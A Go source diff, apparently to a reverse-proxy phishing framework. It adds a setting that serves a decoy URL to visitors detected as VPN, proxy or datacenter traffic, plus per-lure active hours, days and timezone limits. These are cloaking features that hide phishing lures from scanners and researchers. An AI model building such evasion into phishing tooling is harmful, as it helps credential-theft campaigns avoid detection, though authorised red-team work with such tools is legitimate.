@@ -325,6 +325,19 @@ func (t *Terminal) handleConfig(args []string) error {
 				t.cfg.SetStripHeaders(false)
 				return nil
 			}
+		case "blockvpn":
+			switch args[1] {
+			case "on":
+				t.cfg.SetBlockVPN(true)
+				log.Info("VPN/proxy/datacenter blocking: enabled — visitors detected as VPN/proxy/DC will be served unauth_url")
+				return nil
+			case "off":
+				t.cfg.SetBlockVPN(false)
+				log.Info("VPN/proxy/datacenter blocking: disabled")
+				return nil
+			default:
+				return fmt.Errorf("usage: config blockvpn on|off")
+			}
 		case "gophish":
 			switch args[1] {
 			case "test":
@@ -1392,6 +1405,43 @@ func (t *Terminal) handleLures(args []string) error {
 					}
 					do_update = true
 					log.Info("ua_filter = '%s'", l.UserAgentFilter)
+				case "active_hours":
+					if val != "" {
+						hoursRe := regexp.MustCompile(`^\d{2}:\d{2}-\d{2}:\d{2}$`)
+						if !hoursRe.MatchString(val) {
+							return fmt.Errorf("edit: active_hours format must be HH:MM-HH:MM (e.g. 08:00-18:00)")
+						}
+						l.ActiveHours = val
+					} else {
+						l.ActiveHours = ""
+					}
+					do_update = true
+					log.Info("active_hours = '%s'", l.ActiveHours)
+				case "active_days":
+					if val != "" {
+						validDays := map[string]bool{"Mon": true, "Tue": true, "Wed": true, "Thu": true, "Fri": true, "Sat": true, "Sun": true}
+						for _, d := range strings.Split(val, ",") {
+							if !validDays[strings.TrimSpace(d)] {
+								return fmt.Errorf("edit: invalid day '%s' — use Mon,Tue,Wed,Thu,Fri,Sat,Sun", strings.TrimSpace(d))
+							}
+						}
+						l.ActiveDays = val
+					} else {
+						l.ActiveDays = ""
+					}
+					do_update = true
+					log.Info("active_days = '%s'", l.ActiveDays)
+				case "active_tz":
+					if val != "" {
+						if _, err := time.LoadLocation(val); err != nil {
+							return fmt.Errorf("edit: invalid timezone '%s' — use IANA tz name, e.g. America/New_York", val)
+						}
+						l.ActiveTZ = val
+					} else {
+						l.ActiveTZ = ""
+					}
+					do_update = true
+					log.Info("active_tz = '%s'", l.ActiveTZ)
 				}
 				if do_update {
 					err := t.cfg.SetLure(l_id, l)
